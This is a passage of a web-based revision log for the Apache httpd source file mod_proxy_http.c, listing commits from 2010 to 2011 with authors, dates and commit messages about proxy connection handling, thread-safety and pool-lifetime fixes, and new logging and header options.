([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1154342&r2=1174751&diff_format=h))
```
Cleanup effort in prep for GA push:
Trim trailing whitespace... no func change

```

---

Revision [**1154342**](/viewvc?view=revision&revision=1154342) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1154342&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1154342&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1154342))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1154342)

Modified
*Fri Aug 5 18:35:29 2011 UTC*
(13 years, 5 months ago)
by *sf*

File length: 87538 byte(s)

Diff to [previous 1102124](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1102124&r2=1154342)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1102124&r2=1154342&diff_format=h))
```
mod_proxy_http, mod_proxy_connect: Add 'proxy-status' and 'proxy-source-port'
request notes for logging

PR: 30195

```

---

Revision [**1102124**](/viewvc?view=revision&revision=1102124) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1102124&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1102124&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1102124))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1102124)

Modified
*Wed May 11 22:51:46 2011 UTC*
(13 years, 8 months ago)
by *sf*

File length: 87297 byte(s)

Diff to [previous 1069785](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1069785&r2=1102124)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1069785&r2=1102124&diff_format=h))
```
Use APR_STATUS_IS_... in some more cases.

While this is not strictly necessary everywhere, it makes it much easier
to find the problematic cases.

```

---

Revision [**1069785**](/viewvc?view=revision&revision=1069785) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1069785&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1069785&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1069785))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1069785)

Modified
*Fri Feb 11 12:50:31 2011 UTC*
(13 years, 11 months ago)
by *rpluem*

File length: 87289 byte(s)

Diff to [previous 1060795](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1060795&r2=1069785)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1060795&r2=1069785&diff_format=h))
```
* Play safe if the notes table does not contain an SSL_connect_rv key.

```

---

Revision [**1060795**](/viewvc?view=revision&revision=1060795) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1060795&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1060795&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1060795))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1060795)

Modified
*Wed Jan 19 12:48:17 2011 UTC*
(14 years ago)
by *igalic*

File length: 87238 byte(s)

Diff to [previous 1058623](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1058623&r2=1060795)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1058623&r2=1060795&diff_format=h))
```
Add a patch from Vincent Deffontaines to make the adding of X-forwarded-*
headers configurable: ProxyAddHeaders, defaulting to 'On'.
<http://www.mail-archive.com/dev>@httpd.apache.org/msg49971.html

```

---

Revision [**1058623**](/viewvc?view=revision&revision=1058623) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1058623&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1058623&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1058623))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1058623)

Modified
*Thu Jan 13 15:58:57 2011 UTC*
(14 years ago)
by *jim*

File length: 87133 byte(s)

Diff to [previous 1055605](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055605&r2=1058623)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055605&r2=1058623&diff_format=h))
```
More movement to shared stuff...

```

---

Revision [**1055605**](/viewvc?view=revision&revision=1055605) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055605&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055605&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1055605))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1055605)

Modified
*Wed Jan 5 19:47:45 2011 UTC*
(14 years ago)
by *trawick*

File length: 87106 byte(s)

Diff to [previous 1055570](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055570&r2=1055605)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055570&r2=1055605&diff_format=h))
```
fix comment

```

---

Revision [**1055570**](/viewvc?view=revision&revision=1055570) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055570&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055570&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1055570))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1055570)

Modified
*Wed Jan 5 18:33:45 2011 UTC*
(14 years ago)
by *jim*

File length: 87106 byte(s)

Diff to [previous 1055386](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055386&r2=1055570)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055386&r2=1055570&diff_format=h))
```
update comment

```

---

Revision [**1055386**](/viewvc?view=revision&revision=1055386) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055386&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055386&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1055386))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1055386)

Modified
*Wed Jan 5 09:53:55 2011 UTC*
(14 years ago)
by *minfrin*

File length: 87105 byte(s)

Diff to [previous 1055250](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055250&r2=1055386)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055250&r2=1055386&diff_format=h))
```
Make sure we clone the table rather than copy it, to ensure that no keys
or values allocated from r->pool end up referenced in the backend request.

```

---

Revision [**1055250**](/viewvc?view=revision&revision=1055250) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055250&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055250&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1055250))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1055250)

Modified
*Wed Jan 5 00:23:43 2011 UTC*
(14 years ago)
by *minfrin*

File length: 87104 byte(s)

Diff to [previous 1055246](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055246&r2=1055250)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1055246&r2=1055250&diff_format=h))
```
mod_proxy_http: Allocate the fake backend request from a child pool
of the backend connection, instead of misusing the pool of the frontend
request. Fixes a thread safety issue where buckets set aside in the
backend connection leak into other threads, and then disappear when
the frontend request is cleaned up, in turn causing corrupted buckets
to make other threads spin.

```

---

Revision [**1055246**](/viewvc?view=revision&revision=1055246) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055246&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1055246&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1055246))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1055246)

Modified
*Tue Jan 4 23:55:50 2011 UTC*
(14 years ago)
by *minfrin*

File length: 87028 byte(s)

Diff to [previous 1053967](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1053967&r2=1055246)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1053967&r2=1055246&diff_format=h))
```
mod_proxy_http: Ensure that when the backend is closed, the final call to
ap_proxy_http_cleanup() is suppressed, so that the backend is not cleaned
twice. Fixes a further thread safety issue.

```

---

Revision [**1053967**](/viewvc?view=revision&revision=1053967) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1053967&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1053967&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1053967))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1053967)

Modified
*Thu Dec 30 18:32:15 2010 UTC*
(14 years ago)
by *minfrin*

File length: 87025 byte(s)

Diff to [previous 1053584](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1053584&r2=1053967)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1053584&r2=1053967&diff_format=h))
```
Change another variable that could be confused for conn_rec.

```

---

Revision [**1053584**](/viewvc?view=revision&revision=1053584) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1053584&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1053584&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1053584))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1053584)

Modified
*Wed Dec 29 09:43:56 2010 UTC*
(14 years, 1 month ago)
by *rpluem*

File length: 87017 byte(s)

Diff to [previous 1052314](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1052314&r2=1053584)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1052314&r2=1053584&diff_format=h))
```
* Fix [r1039304](/viewvc?view=revision&revision=1039304) and make the patch similar to the one proposed for
  2.2.x: If the SSL handshake to the backend fails we cannot even
  sent an HTTP request. So the check needs to happen already when
  we sent data not when we receive data.

```

---

Revision [**1052314**](/viewvc?view=revision&revision=1052314) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1052314&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1052314&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1052314))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1052314)

Modified
*Thu Dec 23 16:43:43 2010 UTC*
(14 years, 1 month ago)
by *rpluem*

File length: 87058 byte(s)

Diff to [previous 1052224](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1052224&r2=1052314)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1052224&r2=1052314&diff_format=h))
```
* The concept of the cleaned flag is flawed: Once we returned the connection
  to the pool we cannot longer rely on it as another thread could have leased
  the connection in the meantime and might have modified it.
  BUT: We only use this flag once we returned the connection to the pool.
  So signal that we returned the connection to the pool by something that is
  local to the thread, in this case set backend to NULL if we already have
  returende the connection.

```

---

Revision [**1052224**](/viewvc?view=revision&revision=1052224) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1052224&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1052224&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1052224))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1052224)

Modified
*Thu Dec 23 11:10:56 2010 UTC*
(14 years, 1 month ago)
by *rpluem*

File length: 86565 byte(s)

Diff to [previous 1039304](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1039304&r2=1052224)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1039304&r2=1052224&diff_format=h))
```
* Do not fiddle around with the close field if we might have returned the
  connection to the pool already. It might be already in use again by another
  thread.

```

---

Revision [**1039304**](/viewvc?view=revision&revision=1039304) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1039304&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1039304&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1039304))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1039304)

Modified
*Fri Nov 26 10:33:19 2010 UTC*
(14 years, 2 months ago)
by *rpluem*

File length: 86653 byte(s)

Diff to [previous 1035605](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1035605&r2=1039304)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1035605&r2=1039304&diff_format=h))
```
* Put a note in the connection notes that the SSL handshake to the backend
  failed such that mod_proxy can put the worker in error state.

PR: 50332
Submitted by: Daniel Ruggeri <DRuggeri primary.net>
Reviewed by: rpluem

```

---

Revision [**1035605**](/viewvc?view=revision&revision=1035605) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1035605&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1035605&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1035605))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1035605)

Modified
*Tue Nov 16 12:08:38 2010 UTC*
(14 years, 2 months ago)
by *minfrin*

File length: 86282 byte(s)

Diff to [previous 1035576](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1035576&r2=1035605)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1035576&r2=1035605&diff_format=h))
```
When the proxy closes the backend connection early, force a setaside on
any buckets still outstanding to ensure they've been copied out of the
backend connection's pool and it is safe to release the backend connection.

```

---

Revision [**1035576**](/viewvc?view=revision&revision=1035576) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1035576&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1035576&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1035576))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1035576)

Modified
*Tue Nov 16 10:27:26 2010 UTC*
(14 years, 2 months ago)
by *minfrin*

File length: 85389 byte(s)

Diff to [previous 1035504](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1035504&r2=1035576)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1035504&r2=1035576&diff_format=h))
```
Revert [r1035504](/viewvc?view=revision&revision=1035504), this was the wrong way to do it.

```

---

Revision [**1035504**](/viewvc?view=revision&revision=1035504) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1035504&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1035504&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1035504))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1035504)

Modified
*Tue Nov 16 00:23:37 2010 UTC*
(14 years, 2 months ago)
by *minfrin*

File length: 85703 byte(s)

Diff to [previous 1030855](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1030855&r2=1035504)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1030855&r2=1035504&diff_format=h))
```
Fix pool lifetime issues when the proxy backend connection is terminated
early by forcing a setaside on transient buckets placed in the brigade
by mod_ssl. This has the effect of extending the lifetime of buckets until
the end of the request. This is a variation on the original fix for this
problem, which added transient buckets to be setaside later in the process.

```

---

Revision [**1030855**](/viewvc?view=revision&revision=1030855) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1030855&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1030855&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1030855))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1030855)

Modified
*Thu Nov 4 08:37:13 2010 UTC*
(14 years, 2 months ago)
by *minfrin*

File length: 85389 byte(s)

Diff to [previous 1026665](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1026665&r2=1030855)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1026665&r2=1030855&diff_format=h))
```
Fix a pool lifetime issue: Make sure we clean up our brigade before we
hand the backend connection back to the connection pool.

```

---

Revision [**1026665**](/viewvc?view=revision&revision=1026665) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1026665&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1026665&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1026665))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1026665)

Modified
*Sat Oct 23 19:26:44 2010 UTC*
(14 years, 3 months ago)
by *minfrin*

File length: 85384 byte(s)

Diff to [previous 1026636](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1026636&r2=1026665)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1026636&r2=1026665&diff_format=h))
```
mod_proxy: Release the backend connection as soon as EOS is detected,
so the backend isn't forced to wait for the client to eventually
acknowledge the data.

```

---

Revision [**1026636**](/viewvc?view=revision&revision=1026636) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1026636&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1026636&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1026636))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1026636)

Modified
*Sat Oct 23 16:20:10 2010 UTC*
(14 years, 3 months ago)
by *sf*

File length: 84594 byte(s)

Diff to [previous 1026187](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1026187&r2=1026636)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1026187&r2=1026636&diff_format=h))
```
Remove needless pool cleanup. ap_pregcomp already registers a cleanup for the
regex.

```

---

Revision [**1026187**](/viewvc?view=revision&revision=1026187) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1026187&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1026187&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1026187))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1026187)

Modified
*Fri Oct 22 00:46:39 2010 UTC*
(14 years, 3 months ago)
by *minfrin*

File length: 84780 byte(s)

Diff to [previous 1025666](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1025666&r2=1026187)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1025666&r2=1026187&diff_format=h))
```
Fix an inline variable declaration.

```

---

Revision [**1025666**](/viewvc?view=revision&revision=1025666) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1025666&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1025666&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1025666))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1025666)

Modified
*Wed Oct 20 18:33:55 2010 UTC*
(14 years, 3 months ago)
by *minfrin*

File length: 84785 byte(s)

Diff to [previous 999694](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=999694&r2=1025666)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=999694&r2=1025666&diff_format=h))
```
mod_proxy: Move the ProxyErrorOverride directive to have per directory scope.

```

---

Revision [**999694**](/viewvc?view=revision&revision=999694) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=999694&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=999694&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=999694))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=999694)

Modified
*Wed Sep 22 00:07:52 2010 UTC*
(14 years, 4 months ago)
by *trawick*

File length: 84685 byte(s)

Diff to [previous 999288](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=999288&r2=999694)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=999288&r2=999694&diff_format=h))
```
axe an unnecessary call to sscanf() when parsing the response line
from the origin server

apr_date_checkmask() already verified the expected text and digit
positions; all that is needed is to cheaply find which digits

```

---

Revision [**999288**](/viewvc?view=revision&revision=999288) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=999288&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=999288&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=999288))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=999288)

Modified
*Tue Sep 21 09:23:39 2010 UTC*
(14 years, 4 months ago)
by *rpluem*

File length: 84758 byte(s)

Diff to [previous 986699](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986699&r2=999288)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986699&r2=999288&diff_format=h))
```
* LimitRequestBody does not affect Proxy requests (Should it?).
  Let it take effect if we decide to store the body in a
  temporary file on disk.

```

---

Revision [**986699**](/viewvc?view=revision&revision=986699) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986699&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986699&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=986699))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=986699)

Modified
*Wed Aug 18 14:30:50 2010 UTC*
(14 years, 5 months ago)
by *jim*

File length: 84118 byte(s)

Diff to [previous 986468](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986468&r2=986699)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986468&r2=986699&diff_format=h))
```
Pull out "does request have a body" logic to a central
canon function and use that for the 100-Continue OK
check.

Should likely also start using this in the various
other places we do this "have body" check thruout
the codebase...

```

---

Revision [**986468**](/viewvc?view=revision&revision=986468) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986468&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986468&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=986468))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=986468)

Modified
*Tue Aug 17 19:59:39 2010 UTC*
(14 years, 5 months ago)
by *jim*

File length: 84492 byte(s)

Diff to [previous 986333](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986333&r2=986468)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986333&r2=986468&diff_format=h))
```
Fix comment and code to be what it should have been/

thx to r and r for spotting this foobar.

```

---

Revision [**986333**](/viewvc?view=revision&revision=986333) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986333&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986333&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=986333))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=986333)

Modified
*Tue Aug 17 14:43:45 2010 UTC*
(14 years, 5 months ago)
by *jim*

File length: 84493 byte(s)

Diff to [previous 986318](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986318&r2=986333)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986318&r2=986333&diff_format=h))
```
Further checks for non-body requests...

```

---

Revision [**986318**](/viewvc?view=revision&revision=986318) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986318&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986318&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=986318))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=986318)

Modified
*Tue Aug 17 14:15:07 2010 UTC*
(14 years, 5 months ago)
by *jim*

File length: 83952 byte(s)

Diff to [previous 986090](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986090&r2=986318)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=986090&r2=986318&diff_format=h))
```
detab

```

---

Revision [**986090**](/viewvc?view=revision&revision=986090) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986090&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=986090&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=986090))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=986090)

Modified
*Mon Aug 16 18:36:19 2010 UTC*
(14 years, 5 months ago)
by *jim*

File length: 83791 byte(s)

Diff to [previous 953418](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=953418&r2=986090)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=953418&r2=986090&diff_format=h))
```
For backends which are HTTP/1.1, do a quick test (ping)
of the "connection" via 100-Continue for reverse
proxies...

ACO and Filip Hanik also helped out with the idea...

```

---

Revision [**953418**](/viewvc?view=revision&revision=953418) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=953418&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=953418&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=953418))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=953418)

Modified
*Thu Jun 10 18:52:27 2010 UTC*
(14 years, 7 months ago)
by *rjung*

File length: 81242 byte(s)

Diff to [previous 951900](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=951900&r2=953418)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=951900&r2=953418&diff_format=h))
```
